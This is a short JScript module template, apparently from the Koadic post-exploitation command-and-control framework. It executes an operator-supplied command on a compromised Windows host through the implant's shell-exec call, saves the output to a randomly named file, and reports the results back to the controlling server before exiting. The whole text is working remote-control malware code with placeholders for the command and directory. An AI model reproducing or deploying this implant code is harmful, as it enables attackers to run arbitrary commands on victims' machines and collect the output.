try
{
    var output = Koadic.shell.exec("~CMD~", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
    if (output != "")
    {
      Koadic.work.report(output);
    }
}
catch (e)
{
    Koadic.work.error(e)
}

Koadic.exit();
